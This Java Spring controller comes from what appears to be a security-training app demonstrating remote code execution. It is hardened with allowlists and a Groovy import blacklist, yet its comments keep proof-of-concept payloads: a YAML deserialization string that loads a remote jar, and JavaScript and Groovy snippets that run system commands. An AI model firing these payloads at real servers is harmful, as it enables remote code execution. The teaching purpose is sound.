package org.joychou.controller;

import groovy.lang.GroovyShell;
import org.codehaus.groovy.control.CompilerConfiguration;
import org.codehaus.groovy.control.customizers.SecureASTCustomizer;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import org.springframework.web.util.HtmlUtils;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.sql.DriverManager;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    private static final Set<String> ALLOWED_COMMANDS = new HashSet<>(Arrays.asList(
            "whoami", "id", "hostname", "date", "uptime", "uname", "ls", "df", "pwd"
    ));

    private static final Set<String> ALLOWED_JS_HOSTS = new HashSet<>(Arrays.asList(
            "trusted.example.com"
    ));

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        if (cmd == null || !ALLOWED_COMMANDS.contains(cmd.trim())) {
            return "Command not allowed. Allowed commands: " + ALLOWED_COMMANDS;
        }
        Runtime run = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();

        try {
            // Use argv form (no shell) with the validated command
            Process p = run.exec(new String[]{cmd.trim()});
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return HtmlUtils.htmlEscape(e.toString());
        }
        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {
        if (cmd == null || !ALLOWED_COMMANDS.contains(cmd.trim())) {
            return "Command not allowed. Allowed commands: " + ALLOWED_COMMANDS;
        }

        StringBuilder sb = new StringBuilder();

        try {
            // Use argv form without shell to prevent injection
            ProcessBuilder processBuilder = new ProcessBuilder(cmd.trim());
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return HtmlUtils.htmlEscape(e.toString());
        }

        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    @GetMapping("/jscmd")
    public String jsEngine(String jsurl) throws Exception {
        // Validate URL and check host against allowlist
        if (jsurl == null || jsurl.isEmpty()) {
            return "URL is required";
        }
        URL parsedUrl;
        try {
            parsedUrl = new URL(jsurl);
        } catch (MalformedURLException e) {
            return "Invalid URL";
        }
        String scheme = parsedUrl.getProtocol();
        if (!"https".equals(scheme)) {
            return "Only HTTPS URLs are allowed";
        }
        String host = parsedUrl.getHost();
        if (!ALLOWED_JS_HOSTS.contains(host)) {
            return "Host not in allowlist. Allowed hosts: " + ALLOWED_JS_HOSTS;
        }
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        engine.eval("load('" + jsurl.replace("'", "") + "')");
        return "Executed";
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
     * @param content groovy shell
     */
    @GetMapping("groovy")
    public String groovyshell(String content) {
        if (content == null || content.isEmpty()) {
            return "Content is required";
        }
        // Use SecureASTCustomizer to restrict dangerous operations
        SecureASTCustomizer secureASTCustomizer = new SecureASTCustomizer();
        secureASTCustomizer.setImportsBlacklist(Arrays.asList(
                "java.lang.Runtime", "java.lang.ProcessBuilder",
                "java.io.File", "java.lang.System",
                "java.lang.reflect.*", "java.net.*"
        ));
        secureASTCustomizer.setReceiversBlackList(Arrays.asList(
                "java.lang.Runtime", "java.lang.ProcessBuilder",
                "java.lang.System", "java.lang.Class"
        ));
        secureASTCustomizer.setIndirectImportCheckEnabled(true);

        CompilerConfiguration config = new CompilerConfiguration();
        config.addCompilationCustomizers(secureASTCustomizer);

        GroovyShell groovyShell = new GroovyShell(config);
        Object result = groovyShell.evaluate(content);
        return result != null ? HtmlUtils.htmlEscape(result.toString()) : "";
    }



    public static void main(String[] args) throws Exception{
        Runtime.getRuntime().exec("touch /tmp/x");
    }
}

